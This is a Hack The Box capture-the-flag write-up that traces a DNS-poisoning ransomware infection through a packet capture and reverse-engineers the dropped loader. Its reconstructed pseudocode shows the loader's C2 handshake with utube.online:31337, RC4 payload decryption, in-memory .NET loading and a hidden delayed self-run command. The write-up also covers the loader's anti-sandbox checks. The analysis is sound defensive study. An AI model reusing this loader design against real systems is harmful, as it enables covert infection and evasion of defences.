# 🧬 Hack The Box - Reversing Challenge Write-Up:[Malception] – [11/07/2025]
***

## 🕵️‍♂️ Challenge Overview
- **Objective:** retrieve the HTB flag
- **Link to the challenge:** https://app.hackthebox.com/challenges/Malception
- **Challenge Description:** Attackers have infiltrated our domain and poisoned DNS records to infect users with a ransomware. We weren't able to retrieve any artifacts, but we have a packet capture you could use.
- **Difficulty:** Medium
- **📦 Provided Files**:
	- File: `Malception.zip`  
	- Password: `hackthebox`
	- SHA256: `d8e9aba9d671f97ffd8582749d3e44cfb029bdeeba0ef1ec3631ea5fadc06ab4` 
- **📦 Extracted Files**:
	-  File: `capture.pcapng`
	- SHA256: `84e9d4e9b341c4d3ac65576683e1c8cf185aed0501de62b757bbb3a47d67b3ac`
---

## ⚙️ Environment Setup
- **Operating System:** `Windows 11`
- **Tools Used:**
 - **Static analysis:** `file`, `strings`
  - **Packet capture & filtering:** `Wireshark`, `tshark`, `curl`
  - **PE structure & header inspection:** `CFF Explorer`, `PE Bear`, `PE Studio`
  - **Resource exploration:** `Resource Hacker`
  - **Online scanning:** `VirusTotal`
  - **Disassembly & debugging:** `IDA 9.1`, `.NET` decompiler (`dnSpy`)
  - **Scripting & automation:** `Python 3` (custom RC4/RSA/AES scripts, `pycryptodome`)
  - **Hex editing & manual patching:** any standard hex editor

---

## 🔍 Static Analysis

All the relevant files, dumps and codes are accessible at "Resources" folder.

#### Initial Observations
- File
```bash
file capture.pcapng       
capture.pcapng: pcapng capture file - version 1.0
```

- wireshark
```bash
wireshark capture.pcapng &
```


Now, because the challenge description mentions _“attackers poisoned DNS records”_, DNS is the first filter we should apply in Wireshark:

![Screenshot](Images/Pasted%20image%2020250711142934.png)

Alternatively, we can extract these records using the following command:

```bash
tshark -r capture.pcapng -Y dns -T fields -e frame.number -e dns.qry.name -e dns.a > dns.txt
```

The first thing that caught my attention were the first three DNS requests, which involve interactions from `192.168.0.105` to:

- `192.168.0.105 -> 8.8.8.8`
    
- `192.168.0.105 -> 192.168.0.115`
    

It's quite odd for a local address to send a DNS request to another local address, isn’t it? Even more curious is what happens next: every action performed by `192.168.0.105` is almost immediately mirrored by `192.168.0.115`.

This wouldn't be unusual if `192.168.0.105` is acting as an internal DNS **forwarder/cache** (probably the Domain Controller), which:

- Receives DNS queries from other clients (UDP port 53)
    
- Forwards cache misses to Google DNS `8.8.8.8`
    

This **double-query** pattern (client ➜ local DNS **and** client ➜ public DNS) is a **classic sign of cache poisoning or DNS hijack detection**.

Investigating the contents of DNS packet No. 3, we observe:

```pcap
Frame 3: 193 bytes on wire (1544 bits), 193 bytes captured (1544 bits) on interface \Device\NPF_{0BFC9AAD-BE60-4D44-98DB-149A0F450816}, id 0
    Section number: 1
    Interface id: 0 (\Device\NPF_{0BFC9AAD-BE60-4D44-98DB-149A0F450816})
        Interface name: \Device\NPF_{0BFC9AAD-BE60-4D44-98DB-149A0F450816}
        Interface description: Ethernet0
    Encapsulation type: Ethernet (1)
    Arrival Time: Oct 28, 2020 00:13:22.284155000 EDT
    UTC Arrival Time: Oct 28, 2020 04:13:22.284155000 UTC
    Epoch Arrival Time: 1603858402.284155000
    [Time shift for this packet: 0.000000000 seconds]
    [Time delta from previous captured frame: 0.000521000 seconds]
    [Time delta from previous displayed frame: 0.000000000 seconds]
    [Time since reference or first frame: 0.008686000 seconds]
    Frame Number: 3
    Frame Length: 193 bytes (1544 bits)
    Capture Length: 193 bytes (1544 bits)
    [Frame is marked: False]
    [Frame is ignored: False]
    [Protocols in frame: eth:ethertype:ip:udp:dns]
    [Coloring Rule Name: UDP]
    [Coloring Rule String: udp]
Ethernet II, Src: VMware_32:3e:ae (00:0c:29:32:3e:ae), Dst: VMware_a9:01:ff (00:0c:29:a9:01:ff)
    Destination: VMware_a9:01:ff (00:0c:29:a9:01:ff)
        Address: VMware_a9:01:ff (00:0c:29:a9:01:ff)
        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
    Source: VMware_32:3e:ae (00:0c:29:32:3e:ae)
        Address: VMware_32:3e:ae (00:0c:29:32:3e:ae)
        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)
        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)
    Type: IPv4 (0x0800)
Internet Protocol Version 4, Src: 192.168.0.105, Dst: 192.168.0.115
    0100 .... = Version: 4
    .... 0101 = Header Length: 20 bytes (5)
    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)
        0000 00.. = Differentiated Services Codepoint: Default (0)
        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)
    Total Length: 179
    Identification: 0x1b7f (7039)
    0. .... = Flags: 0x0
        0... .... = Reserved bit: Not set
        .0.. .... = Don't fragment: Not set
        ..0. .... = More fragments: Not set
    ...0 0000 0000 0000 = Fragment Offset: 0
    Time to Live: 128
    Protocol: UDP (17)
    Header Checksum: 0x9c8e [validation disabled]
    [Header checksum status: Unverified]
    Source Address: 192.168.0.105
    Destination Address: 192.168.0.115
User Datagram Protocol, Src Port: 53, Dst Port: 63780
    Source Port: 53
    Destination Port: 63780
    Length: 159
    Checksum: 0x99d1 [unverified]
    [Checksum Status: Unverified]
    [Stream index: 1]
    [Timestamps]
        [Time since first frame: 0.000000000 seconds]
        [Time since previous frame: 0.000000000 seconds]
    UDP payload (151 bytes)
Domain Name System (response)
    Transaction ID: 0xb40c
    Flags: 0x8180 Standard query response, No error
        1... .... .... .... = Response: Message is a response
        .000 0... .... .... = Opcode: Standard query (0)
        .... .0.. .... .... = Authoritative: Server is not an authority for domain
        .... ..0. .... .... = Truncated: Message is not truncated
        .... ...1 .... .... = Recursion desired: Do query recursively
        .... .... 1... .... = Recursion available: Server can do recursive queries
        .... .... .0.. .... = Z: reserved (0)
        .... .... ..0. .... = Answer authenticated: Answer/authority portion was not authenticated by the server
        .... .... ...0 .... = Non-authenticated data: Unacceptable
        .... .... .... 0000 = Reply code: No error (0)
    Questions: 1
    Answer RRs: 4
    Authority RRs: 0
    Additional RRs: 0
    Queries
        www.bing.com: type A, class IN
            Name: www.bing.com
            [Name Length: 12]
            [Label Count: 3]
            Type: A (1) (Host Address)
            Class: IN (0x0001)
    Answers
        www.bing.com: type CNAME, class IN, cname a-0001.a-afdentry.net.trafficmanager.net
            Name: www.bing.com
            Type: CNAME (5) (Canonical NAME for an alias)
            Class: IN (0x0001)
            Time to live: 19720 (5 hours, 28 minutes, 40 seconds)
            Data length: 42
            CNAME: a-0001.a-afdentry.net.trafficmanager.net
        a-0001.a-afdentry.net.trafficmanager.net: type CNAME, class IN, cname dual-a-0001.a-msedge.net
            Name: a-0001.a-afdentry.net.trafficmanager.net
            Type: CNAME (5) (Canonical NAME for an alias)
            Class: IN (0x0001)
            Time to live: 43 (43 seconds)
            Data length: 23
            CNAME: dual-a-0001.a-msedge.net
        dual-a-0001.a-msedge.net: type A, class IN, addr 13.107.21.200
            Name: dual-a-0001.a-msedge.net
            Type: A (1) (Host Address)
            Class: IN (0x0001)
            Time to live: 39 (39 seconds)
            Data length: 4
            Address: 13.107.21.200
        dual-a-0001.a-msedge.net: type A, class IN, addr 204.79.197.200
            Name: dual-a-0001.a-msedge.net
            Type: A (1) (Host Address)
            Class: IN (0x0001)
            Time to live: 39 (39 seconds)
            Data length: 4
            Address: 204.79.197.200
    [Unsolicited: True]
```

The packet shown is a **DNS reply that arrived without a matching request from `192.168.0.115`**—a textbook sign of a spoofing or cache-poisoning attempt. Wireshark's own dissector even labels it as _“/** This is an unsolicited response **/”_. 

Before diving further, let’s also take a look at the **Statistics** to spot any unusual patterns in the network, such as anomalies in packet sizes, timing, or traffic distribution.

In Wireshark, navigate to:

**Statistics ➜ Capture File Properties**

This will provide key information like the capture's start and end times, as well as total packet counts.

![Screenshot](Images/Pasted%20image%2020250711141654.png)
which seems 17 seconds.

Let's do a bit of reconnaissance and profile the traffic mix:

1. Statistics ➜ **“Protocol Hierarchy”** to see which protocols dominate:

![Screenshot](Images/Pasted%20image%2020250711141933.png)

2. Statistics ➜ **“Endpoints”** (IPv4/IPv6) highlights who’s talking to whom:
    
3. Statistics ➜ **“Conversations”** and **“Endpoints”** help catalogue the communications.
    

From the above statistics, a few things stand out as prime suspects:

1. **Only ~20 DNS packets in total**: Suggests DNS was merely a _redirection_ vector, not the main data channel. The heavy lifting is happening over unusual TCP services.
    
2. **192.168.0.104 → ports 8000, 31337, 31338**: These are non-standard, suspicious ports.
    
3. **Large one-way transfers**: 24 kB on port 8000; ~165 kB and ~47 kB on port 31338, all coming **from** `192.168.0.104`.
    

At this point, it’s definitely worth checking what `192.168.0.104` is doing by filtering for this IP address:
![Screenshot](Images/Pasted%20image%2020250711155952.png)

We observe a lot of traffic between `104` and `115`, but the key discovery is that `104` sent an `.exe` file—`http://utube.online:8000/xQWdrq.exe`—to `115`. This strongly suggests that `115` is the victim, and `104` is acting as the attacker.

Let’s follow the HTTP stream:

![Screenshot](Images/Pasted%20image%2020250711160456.png)

And we’ve found the malware sample we need to analyze! (`MZ` is the magic header for `.exe` files). To export it:

Click on the relevant HTTP packet → **File ➜ Export Objects ➜ HTTP** → select the only raw file shown → click **Save** → the `.exe` file is now saved and ready for analysis.

We can now close Wireshark and proceed with standard Windows binary reverse engineering.

- File:

```bash
└─$ file xQWdrq.exe 
xQWdrq.exe: PE32+ executable (console) x86-64, for MS Windows, 6 sections
```

- strings:

```bash
┌──(kali㉿kali)-[~/Downloads/rev_malception]
└─$ strings xQWdrq.exe 
!This program cannot be run in DOS mode.
RichsU
.text
`.rdata
@.data
.pdata
@.rsrc
@.reloc
UVWAVAWH
T$ D
|$ f
T$ D
T$ L
T$ H
A_A^_^]
L$ SUVH
@^][
|$83
t$0H
t$(L
\$ H
|$8H
@^][
@^][
L$4A
D$08
9l$8H
T$0H
D\$P
f9<Au
D$ H
L$0H3
@UWATH
d$PH
d$xL
\$PH
\$PH
D$XE3
D$HH
D$@3
d$8L
A\_]
\$8H
UVWAVAWH
|$pL
|$xL
L$pL
L$pH
L$pH
L$xL
L$xH
L$xH
D$@H
D$@H
)D$P
L$`H
T$0L
t$(H
T$PH
T$ E3
A_A^_^]
D$8H
D$8H
D$@H
@SVWH
T$`H
L$hH
T$`L
L$0L
L$pH
L$(3
@_^[
\$@H
t$HH
\$0H
t!eH
uxHc
uTL+
\$ UH
M H1E
 H3E H3E
\$HH
L$0L
L$(H
L$ 3
L$PH
D$PH
D$@H
D$H3
u0HcH<H
;csm
\$03
\$0H
\$0H
ntelA
GenuD
ineI
t(=`
t!=p
 w$H
T$ H
D$ "
D$ $
\$(3
t$0H
UWAVH
l$0H
e A^_]
D$(H
D$ D
t$(H
|$ D
\$0H
x AVH
\$0H
l$8H
t$@H
|$HH
x AVH
\$0H
l$8H
t$@H
|$HH
Unknown exception
bad allocation
bad array new length
z11gj1
533_11s4
31337
utube.online
CorpSpace.CorpClass
)+c6
RSDS
C:\Repos\Launcher\x64\Release\Launcher.pdb
GCTL
.text$di
.text$mn
.text$mn$00
.text$x
.text$yd
.idata$5
.00cfg
.CRT$XCA
.CRT$XCAA
.CRT$XCU
.CRT$XCZ
.CRT$XIA
.CRT$XIAA
.CRT$XIAC
.CRT$XIZ
.CRT$XLA
.CRT$XLAAA
.CRT$XLAAB
.CRT$XLZ
.CRT$XPA
.CRT$XPZ
.CRT$XTA
.CRT$XTZ
.rdata
.rdata$T
.rdata$r
.rdata$zzzdbg
.rtc$IAA
.rtc$IZZ
.rtc$TAA
.rtc$TZZ
.tls
.tls$ZZZ
.xdata
.xdata$x
.idata$2
.idata$3
.idata$4
.idata$6
.data
.data$r
.bss
.pdata
.rsrc$01
.rsrc$02
 > @
 > @(
SizeofResource
VirtualAlloc
LockResource
LoadResource
FindResourceW
GetModuleHandleW
GetModuleFileNameW
OpenProcess
CreateToolhelp32Snapshot
Process32NextW
K32GetModuleBaseNameW
Process32FirstW
CloseHandle
GetCurrentProcessId
CreateProcessW
GetComputerNameExA
KERNEL32.dll
OLEAUT32.dll
freeaddrinfo
getaddrinfo
WS2_32.dll
CLRCreateInstance
mscoree.dll
__CxxFrameHandler4
__std_terminate
__C_specific_handler
__std_exception_copy
__std_exception_destroy
_CxxThrowException
__current_exception
__current_exception_context
memset
VCRUNTIME140_1.dll
VCRUNTIME140.dll
exit
__stdio_common_vswprintf
_callnewh
malloc
_seh_filter_exe
_set_app_type
__setusermatherr
_configure_narrow_argv
_initialize_narrow_environment
_get_initial_narrow_environment
_initterm
_initterm_e
_exit
_set_fmode
__p___argc
__p___argv
_cexit
_c_exit
_register_thread_local_exe_atexit_callback
_configthreadlocale
_set_new_mode
__p__commode
free
_initialize_onexit_table
_register_onexit_function
_crt_atexit
terminate
api-ms-win-crt-runtime-l1-1-0.dll
api-ms-win-crt-stdio-l1-1-0.dll
api-ms-win-crt-heap-l1-1-0.dll
api-ms-win-crt-math-l1-1-0.dll
api-ms-win-crt-locale-l1-1-0.dll
RtlCaptureContext
RtlLookupFunctionEntry
RtlVirtualUnwind
UnhandledExceptionFilter
SetUnhandledExceptionFilter
GetCurrentProcess
TerminateProcess
IsProcessorFeaturePresent
QueryPerformanceCounter
GetCurrentThreadId
GetSystemTimeAsFileTime
InitializeSListHead
IsDebuggerPresent
GetLastError
MultiByteToWideChar
LocalFree
memcpy
.?AVbad_alloc@std@@
.?AVexception@std@@
.?AVbad_array_new_length@std@@
.?AVtype_info@@
.?AV_com_error@@
fv;}mR
S<ta
fE9 n
CzK     R
|H!C
=&Ns
0|8`
guTZ
,swR
        p+ 
F       ~.K
}JNd~>O!Y 
xB@~
G|e<1
wKOE
?~>y
VqpB
x`exa|-OS)
pC1*z
VLj{
QKwKd
uZ6U
;H)+
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>

```

From this string extract, I can make several assumptions:

- It’s likely a **first-stage malware**, as the presence of the `utube` domain again suggests it might be downloading additional payloads.
    
- Based on the **exported API names**, it appears to function as a **remote process injector**, likely scanning for target processes.
    
- It may be **accessing its own embedded resources**, possibly to load configuration data or additional binaries.
    
- Some strings might be **encrypted or obfuscated**, making static analysis more difficult.
    
- There's a leftover debug path: `C:\Repos\Launcher\x64\Release\Launcher.pdb`, which could help identify the original project or structure.
    
- The binary is probably written in **C or C++**, based on the coding patterns and build artifacts.

Let’s begin the static analysis of this new `.exe` file using the available tools and findings:

---

### **CFF Explorer Analysis:**

- **PE Type:** PE64 file
    
- **Compiler:** Microsoft Visual C++ 8.0
    
- **File Size:** 23,040 bytes (relatively small)
    

---

### **File Header:**

- **Architecture:** AMD64
    
- **Sections:** 6 sections present
    
- **TimeDateStamp:** `5F98E698` → Wednesday, 28 October 2020, 03:33:44 — plausible and not obviously spoofed
    

---

### **Optional Header:**

- **Entry Point:** `0x2374` inside `.text` → not inherently suspicious
    
- **Subsystem:** Console application
    
- **Overall fields:** Appear typical for a standard C++ binary
    
- **⚠️ Missing File Checksum:**
    
    - Checksum field is absent
        
    - Expected: `0x00015869`
        
    - This may indicate **post-compilation tampering**, often used to evade integrity checks
        

---

### **Data Directories Present:**

- **Import**
    
- **Resource**
    
- **Exception**
    
- **Relocation**
    
- **Debug**
    
- **TLS**
    
- **Configuration**
    

> Given their presence and relevance to malware behavior, it's worth exploring:

- **Resource**: Especially since APIs interacting with resources were observed
    
- **Debug**: May leak paths, compiler, or original project names
    
- **TLS**: To check for early-stage code injection or anti-debugging setups
    

---

### **Sections:**

- 6 standard sections: `.text`, `.rdata`, `.data`, `.pdata`, `.rsrc`, `.reloc`
    
- **Only `.text` is executable** → good sign, no hidden code in non-code sections
    
- **Virtual Size vs. Raw Size:**
    
    - Slight inflation at runtime for `.reloc` and `.data`
        
    - Could indicate **runtime allocation**, packing, or shellcode stubs
        

---

### **Imports:**

- Many DLLs — a mix of expected and potentially dangerous:
    
    - **Common C++ dependencies**: `Kernel32.dll`, `VCRUNTIME140*.dll`
        
    - **Networking libraries**: `ws2_32.dll` → ⚠️ indicates the ability to communicate externally
        
- **Kernel32.dll**:
    
    - Contains already-known APIs observed in string dump
        
- **Ordinal Imports**:
    
    - Appear in `OLEAUT32.dll`, `WS2_32.dll`
        
    - ⚠️ These are stealthier and bypass string-based detection
        
    - Could resolve to functions with potentially harmful purposes
        

---

### **Debug Directory:**

- Matches file header `TimeDateStamp` → suggests **no tampering post-build**
    
- Reinforces the idea of a compiled, then post-processed file
    

---

### **Resource Directory:**

- Contains:
    
    - **RCData resource**: ⚠️ Highly suspicious — can store arbitrary binary data, often encrypted payloads or configuration blobs
        
    - **Manifest file**: Standard for application metadata
        
- Suggestion: Use **Resource Hacker** or similar to explore RCData contents — possible encrypted second-stage, config, or embedded shellcode
    

---

### **Skipped (for now):**

- Exception, Relocation, and Configuration directories — better handled with more specialized tools in upcoming stages

- **PE Bear:**  
    ◦ Rich header analysis confirms it is a Microsoft Visual C++ binary compiled with VS 2015  
    ◦ Debug analysis: Visual C++ (CodeView), leaked string `C:\Repos\Launcher\x64\Release\Launcher.pdb`  
    ◦ TLS contains callback functions, which might trigger early code execution — be careful, it’s worth disassembling to see what that code does
    
- **PE Studio:**  
    ◦ This is an extract of the potential danger of the APIs used:
    
    ![Screenshot](Images/Pasted%20image%2020250717163541.png)
    
    PE Studio warn of unknown signature for RCData resource:
    ![Screenshot](Images/Pasted%20image%2020250717163644.png)
    - Normal manifest resource found:
    ![Screenshot](Images/Pasted%20image%2020250717163708.png)
    What’s important to analyze is the entropy of each section, which appears naturally high in `.text` (due to code), but is especially high in the `.rsrc` section as well — this might indicate the presence of encrypted content.
    ![Screenshot](Images/Pasted%20image%2020250717163744.png)

- **Resource Hacker:** inspecting the hex view of the RCData shows:
- ![Screenshot](Images/Pasted%20image%2020250717163835.png)
This is without any doubt an encrypted section. It’s 99% malicious in my opinion.

- **VirusTotal results:** 4/68 – suspicious file:  
    [https://www.virustotal.com/gui/file/3a2eac0e2dfb01d86dd71716768a986821feecc1c47aafa7374155927faa7eb6](https://www.virustotal.com/gui/file/3a2eac0e2dfb01d86dd71716768a986821feecc1c47aafa7374155927faa7eb6)
    

The hints all point in the same direction and are crystal clear:  
The static analysis of this file raises strong suspicions of malicious activity — especially due to the high entropy and type of the resource section, the presence of potential TLS early code execution (whose behavior is still unknown), and the use of APIs capable of process injection, network communication, and debugger detection.

It’s time to get our hands dirty and bring out the heavy machinery: let’s disassemble everything using IDA 9.1.

As soon as the binary is loaded into IDA, we’re shown the graph of `int __fastcall main`, but before diving into that, it’s better to analyze code that may execute **before** this function — due to how Windows loads executable binaries — specifically the **TLS callbacks**.

So let’s navigate to the callback addresses and inspect the code:

- **Address of TLS Callback 1:** Based on the info from PE Bear, we know this is located at `0x140001270`, and in IDA (which labels this as `TlsCallback_0`), we see the following (partial screenshot):
![Screenshot](Images/Pasted%20image%2020250717164012.png)
![Screenshot](Images/Pasted%20image%2020250717164019.png)
![Screenshot](Images/Pasted%20image%2020250717164026.png)

...even more suspicious! It inspects the list of running processes before reaching `main`, locates a specific one, opens it, and performs what appears to be a decryption routine. Why would it do that? There are several possible reasons, including anti-debugging, process injection (very likely), environmental awareness, or other malicious purposes. Placing a breakpoint here would definitely be worthwhile to see which process it's targeting.
Since I’ve decided to proceed with full static analysis, I decompiled this function using AI to understand its behavior in detail:

---

### **TLS Callback #0 (`0x140001270`)**

1. **Gathers parent process information**
    
    - Retrieves its own PID via `GetCurrentProcessId`
        
    - Creates a snapshot of all processes using `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)`
        
    - Iterates over the snapshot with `Process32FirstW` / `Process32NextW` to find the entry matching its PID
        
    - Extracts the **parent PID** from that entry into `EBX`
        
2. **Extracts the parent’s executable name**
    
    - Opens the parent process using `OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, ..., ParentPID)`
        
    - Calls `K32GetModuleBaseNameW(handle, NULL, buffer, 0x64)` to get the base name (e.g. `powershell.exe`)
        
3. **Computes a checksum of the name**
    
    - Iterates through the UTF-16 string using SSE instructions (8 × 16-bit chunks at a time)
        
    - Sums all UTF-16 code units; result is stored in `EDI`
        
4. **Validates the checksum**
    
    - Compares the sum with constant `0x5B5` (decimal 1461)
        
    - If not equal, it calls `exit(0)` and terminates
        
    - Only proceeds if the checksum **does** match
        

**Why `0x5B5`?**  
Because the UTF-16-LE sum of `"powershell.exe"` equals **1461** exactly.

If that’s just the first TLS callback, I’m very curious to see what the second one reveals!

- **Address of TLS Callback #2:** `0x140001440` (labeled as `TlsCallback_1` in IDA)

![Screenshot](Images/Pasted%20image%2020250717164116.png)

Cheeky! This is a very common anti-debug trick that uses **CPUID** as an anti-sandbox technique. If it detects it's running inside a sandbox, it exits without executing the main function. We’ll need to bypass this at runtime.

Now that we have a rough idea that something suspicious is happening before the `main` function (and although more investigation is needed, this gives us a general understanding), let’s move on to the `main` function.

![Screenshot](Images/Pasted%20image%2020250717164306.png)

It seems it’s initializing the Winsock connection protocol and retrieving IP address information for `utube.online:31337` — a remote C2 server.

![Screenshot](Images/Pasted%20image%2020250717164354.png)

It opens a socket and attempts to connect to a remote server. If it fails, it retries in a loop… not good: this is a common pattern for a reverse connection, typically used to bypass firewall restrictions. Let’s see what happens if the connection succeeds:

![Screenshot](Images/Pasted%20image%2020250717164411.png)

It seems the code sends a hardcoded text `"z11gj1"` — possibly a stage-1 hello message to notify the server that the client is ready to receive data or transition to a second stage.

![Screenshot](Images/Pasted%20image%2020250717164445.png)

Then there is a `recv(buf, 0x400);` — this appears to be the **stage-1 reply from the server**.  
We’ve received some data from the server (its contents are unknown since we’re not connected to the actual C2, so we’ll skip that for now).

Next, it retrieves the NetBIOS/DNS hostname using `GetComputerNameExA(host);`

Next:

![Screenshot](Images/Pasted%20image%2020250717164501.png)

Here something interesting happens: the hostname is XORed with the reply received from the remote C2 (the decryption key is not hardcoded):  
`xor_in_place(host, buf); // host ^= first reply`

After this, we see that:
![Screenshot](Images/Pasted%20image%2020250717164540.png)

Another hardcoded marker is sent to the C2 containing the string `"533_11s4"` →  
`send("533_11s4\n"); // stage-2 hello`  
This is another command sent to the server to inform that the victim is ready for the next action. What’s the next action? Let’s see:

![Screenshot](Images/Pasted%20image%2020250717164557.png)

The victim is now ready to receive additional data. We don’t know exactly what’s being received, but based on the behavior of the following code:

```C
tmp  = VirtualAlloc(0x2710);
len1 = recv(tmp, 0x1E00);            // encrypted blob #1
key? = sub_140001010(tmp, host);     // decrypt/patch blob #1
      // ^ returns pointer (r15) to decrypted buffer
```

It’s likely receiving an encrypted blob (we assume it’s encrypted because it’s passed to `sub_140001010`). We don’t yet know what this data is — another decryption key? A shellcode?

Then it calls the function `sub_140001010`, which appears to be used more than once — almost certainly a **decryption or patching routine**.

Before moving on, let’s analyze this undefined function:

- **`sub_140001010`:**

![Screenshot](Images/Pasted%20image%2020250717164624.png)
![Screenshot](Images/Pasted%20image%2020250717164717.png)

I can confirm this really looks like a decryption routine. I had it analyzed by AI, and it identified an **RC4-style key-schedule and PRGA** (256-byte S-box). It returns a pointer (`r15`) to the decrypted buffer.

Let’s continue examining the `main` function:

![Screenshot](Images/Pasted%20image%2020250717164735.png)
![Screenshot](Images/Pasted%20image%2020250717164756.png)

Here the code is clearly trying to retrieve the encrypted built-in resource we identified during static analysis and is decrypting it using the same decryption algorithm seen earlier:

```cpp
// --- embedded resource ----------------------------------
res     = Find/Load/LockResource(id=0x65, 'e');
res_mem = VirtualAlloc(SizeofResource);
memcpy(res_mem, res, resSize);

sub_140001010(res_mem, host);        // decrypt/patch blob #2
blend(res_mem, key);                 // byte-wise copy @ +0xDB0

```

Then we see:

![Screenshot](Images/Pasted%20image%2020250717164827.png)
![Screenshot](Images/Pasted%20image%2020250717164839.png)

Which we can’t really understand until we further analyze `sub_1400011A0` and `sub_140001980`, so let’s start with:

- **`sub_140001980`:**

![Screenshot](Images/Pasted%20image%2020250717164954.png)
![Screenshot](Images/Pasted%20image%2020250717165006.png)
![Screenshot](Images/Pasted%20image%2020250717165011.png)

Etc… (partial screenshot). AI identified this as a function to **prepare a .NET stager**:  
`sub_140001980(blobA, ComputerName)` →  
Creates a **CLR v4.0.30319** in-process, builds a **SAFEARRAY** containing the merged payload, instantiates `CorpSpace.CorpClass`, and will later invoke its `EntryPoint` method.  
Essentially, this is a **.NET loader implementation** embedded in a native executable like this one.  
That managed entry point is the **true second-stage payload** the authors intended to execute.

- **`sub_1400011A0`:**

![Screenshot](Images/Pasted%20image%2020250717165023.png)

The above is just a thin wrapper around `__stdio_common_vswprintf` — it simply assembles a wide-string command line into a local buffer, which is then used to supply the argument to `CreateProcessW` for spawning a new process.

Ok, so now we can better understand what this last part of the `main` function we were examining earlier is actually doing:

![Screenshot](Images/Pasted%20image%2020250717165108.png)
![Screenshot](Images/Pasted%20image%2020250717165119.png)

And basically, it is:

1. Merging **blob A** (received from the remote server and decrypted locally using RC4) with **blob B** (extracted from local resources and decrypted at runtime using the same RC4)
    
2. Tearing down Winsock (network phase completed)
    
3. Preparing the **.NET stager** — `sub_140001980(blobA, ComputerName)`
    
4. Building a **delay-run command line** for `CreateProcessW` — `sub_1400011A0`:  
    `"cmd.exe /C ping 127.0.0.1 -n 10 > Nul & <decoded-path>"`
    
5. Spawning a hidden child process: `CreateProcessW` with `dwCreationFlags = CREATE_NO_WINDOW (0x08000000)` and the command just built
    
6. Cleanup and exit
    

In pseudo-code, this is what’s happening in `main`:

```c
// ----------------------------------------------------------------------------
// main – complete pseudocode
// ----------------------------------------------------------------------------
int __fastcall main(int argc, char **argv, char **envp)
{
    /* -----------------------------------------------------------------
       1.  Winsock initialisation
       ----------------------------------------------------------------- */
    WSADATA         ws;
    if (WSAStartup(MAKEWORD(2,2), &ws) != 0)
        return -1;                                       // early abort

    /* -----------------------------------------------------------------
       2.  Resolve utube.online:31337 and connect
       ----------------------------------------------------------------- */
    ADDRINFOA       hints  = {0};
    ADDRINFOA      *list   = NULL;
    SOCKET          s      = INVALID_SOCKET;

    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo("utube.online", "31337", &hints, &list) != 0)
        goto fail_net;

    for (ADDRINFOA *cur = list; cur; cur = cur->ai_next)
    {
        s = socket(cur->ai_family, cur->ai_socktype, cur->ai_protocol);
        if (s == INVALID_SOCKET)              continue;
        if (connect(s, cur->ai_addr, cur->ai_addrlen) == 0) break;

        closesocket(s);                       s = INVALID_SOCKET;
    }
    freeaddrinfo(list);

    if (s == INVALID_SOCKET)                  goto fail_net;

    /* -----------------------------------------------------------------
       3.  Stage-1 handshake
       ----------------------------------------------------------------- */
    send(s, "z11gj1\n", 7, 0);                        // literal banner
    BYTE netBuf[0x400] = {0};
    recv(s, netBuf, sizeof(netBuf), 0);               // up to 0x400 bytes

    /* -----------------------------------------------------------------
       4.  Per-host decryption key
           hostname ^= first-reply (one-time pad)
       ----------------------------------------------------------------- */
    CHAR host[256]   = {0};
    DWORD hostLen    = sizeof(host);
    GetComputerNameExA(ComputerNamePhysicalDnsHostname, host, &hostLen);

    for (DWORD i = 0; host[i]; ++i)
        host[i] ^= netBuf[i];

    /* -----------------------------------------------------------------
       5.  Stage-2 handshake
       ----------------------------------------------------------------- */
    if (send(s, "533_11s4\n", 9, 0) == SOCKET_ERROR)
        goto fail_sock;

    /* -----------------------------------------------------------------
       6.  Pull encrypted payload A from network
       ----------------------------------------------------------------- */
    SIZE_T   sizeA   = 0x1E00;                         // 7 680 bytes
    BYTE    *blobA   = (BYTE*)VirtualAlloc(NULL, 0x2710,
                                           MEM_COMMIT, PAGE_READWRITE);
    if (!blobA)                                        goto fail_sock;
    recv(s, blobA, sizeA, 0);

    /* -----------------------------------------------------------------
       7.  Decrypt payload A  (RC4-style)
       ----------------------------------------------------------------- */
    BYTE *stageA = sub_140001010(blobA, host, (DWORD)sizeA);
    // NB: returns ptr in RWX region; blobA itself is XORed in place too.

    /* -----------------------------------------------------------------
       8.  Extract & decrypt resource payload B (ID=0x65, type “e”)
       ----------------------------------------------------------------- */
    HMODULE  mod     = GetModuleHandleW(NULL);
    HRSRC    hRes    = FindResourceW(mod, MAKEINTRESOURCEW(0x65), L"e");
    DWORD    resSz   = SizeofResource(mod, hRes);
    HGLOBAL  hGlob   = LoadResource(mod, hRes);
    BYTE    *srcB    = (BYTE*)LockResource(hGlob);

    BYTE *blobB      = (BYTE*)VirtualAlloc(NULL, resSz,
                                           MEM_COMMIT, PAGE_READWRITE);
    memcpy(blobB, srcB, resSz);
    sub_140001010(blobB, host, resSz);                 // decrypt in place

    /* -----------------------------------------------------------------
       9.  Patch payload A with payload B at offset 0xDB0
       ----------------------------------------------------------------- */
    for (DWORD i = 0; i < resSz; ++i)
        stageA[0xDB0 + i] = blobB[i];

    /* -----------------------------------------------------------------
      10.  Winsock teardown – network work is finished
       ----------------------------------------------------------------- */
    closesocket(s);                                   // falls through
fail_sock:
    WSACleanup();

    /* -----------------------------------------------------------------
      11.  .NET stager – load CLR & execute managed EntryPoint
       ----------------------------------------------------------------- */
    sub_140001980(stageA, host);                       // heavy COM code

    /* -----------------------------------------------------------------
      12.  Build delay-run command line (“ping sleep + self”)
           Example:  cmd.exe /C ping 127.0.0.1 -n 10 > Nul & "C:\path\self.exe"
       ----------------------------------------------------------------- */
    WCHAR   selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, ARRAYSIZE(selfPath));

